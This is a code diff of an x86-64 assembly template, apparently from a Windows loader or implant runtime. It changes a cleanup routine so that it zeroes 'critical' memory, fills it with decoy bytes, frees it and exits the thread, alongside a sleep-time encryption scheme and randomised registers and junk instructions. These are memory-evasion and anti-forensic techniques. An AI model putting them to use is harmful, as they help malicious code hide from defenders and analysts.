@@ -19,10 +19,10 @@
 
 // step:
 //   encrypt return address                                erase return address
-//   encrypt critical instructions to shelter              fill critical memory with decoy
-//   adjust the critical memory page protect               free critical memory page
-//   fill critical memory with decoy                       exit thread
-//   encrypt stack about structure
+//   encrypt critical instructions to shelter              adjust the critical memory page protect
+//   adjust the critical memory page protect               fill critical memory with decoy
+//   fill critical memory with decoy                       free critical memory page
+//   encrypt stack about structure                         exit current thread
 //   call WaitForSingleObject
 //   decrypt stack about structure
 //   recover the critical instructions from shelter
@@ -170,17 +170,47 @@ method_sleep:
 
 method_free:
   mov {{.RegN.rbp}}, rcx                       {{iji}} // save structure pointer
-  mov rax, [{{.RegN.rbp}} + 1*8]               {{iji}} // get address of VirtualFree
-  mov rcx, [{{.RegN.rbp}} + 3*8]               {{iji}} // lpAddress
-  xor rdx, rdx                                 {{iji}} // dwSize = 0
-  mov r8, 0x4000                               {{iji}} // dwFreeType = MEM_RELEASE
+
+  // erase critical memory
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
+  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 4*8]     {{iji}} // set critical size
+  shr {{.RegV.rdx}}, 3                         {{iji}} // calculate the loop count
+  xor {{.RegV.r9}}, {{.RegV.r9}}               {{iji}} // zero value
+ loop_erase_free:
+  mov [{{.RegV.rcx}}], {{.RegV.r9}}            {{iji}} // erase data
+  add {{.RegV.rcx}}, 8                         {{iji}} // next field
+  dec {{.RegV.rdx}}                            {{iji}} // update loop count
+  jnz loop_erase_free                          {{iji}} // check need erase next
+
+  // fill critical memory with decoy
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 5*8]     {{iji}} // set decoy address
+  mov {{.RegV.rdx}}, [{{.RegN.rbp}} + 6*8]     {{iji}} // set decoy size (loop count)
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // set critical address
+  test {{.RegV.rdx}}, {{.RegV.rdx}}            {{iji}} // check decoy size is zero
+  jz skip_decoy_free                           {{iji}} // check need skip
+ loop_decoy_free:
+  movzx {{.RegV.r8}}, byte ptr [{{.RegV.rcx}}] {{iji}} // load one byte from decoy
+  mov [{{.RegV.rax}}], {{.RegV.r8b}}           {{iji}} // write one byte to critical
+  inc {{.RegV.rcx}}                            {{iji}} // update decoy address
+  inc {{.RegV.rax}}                            {{iji}} // update critical address
+  dec {{.RegV.rdx}}                            {{iji}} // update loop count
+  jnz loop_decoy_free                          {{iji}} // check need fill next
+ skip_decoy_free:
+
+  // free critical memory
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 1*8]     {{iji}} // get address of VirtualFree
+  mov {{.RegV.rcx}}, [{{.RegN.rbp}} + 3*8]     {{iji}} // lpAddress
+  xor {{.RegV.rdx}}, {{.RegV.rdx}}             {{iji}} // dwSize = 0
+  mov {{.RegV.r8}}, 0x4000                     {{iji}} // dwFreeType = MEM_RELEASE
   sub rsp, 0x20                                {{iji}} // reserve stack for call convention
-  call rax                                     {{iji}} // call VirtualFree
+  call {{.RegV.rax}}                           {{iji}} // call VirtualFree
   add rsp, 0x20                                {{iji}} // restore stack for call convention
-  mov rax, [{{.RegN.rbp}} + 2*8]               {{iji}} // get ExitThread address
-  xor rcx, rcx                                 {{iji}} // dwExitCode = 0
+
+  // exit current thread
+  mov {{.RegV.rax}}, [{{.RegN.rbp}} + 2*8]     {{iji}} // get address of ExitThread
+  xor {{.RegV.rcx}}, {{.RegV.rcx}}             {{iji}} // dwExitCode = 0
   sub rsp, 0x20                                {{iji}} // reserve stack for call convention
-  call rax                                     {{iji}} // call ExitThread
+  call {{.RegV.rax}}                           {{iji}} // call ExitThread
   add rsp, 0x20                                {{iji}} // restore stack for call convention
   ret                                          {{iji}} // unreachable
 
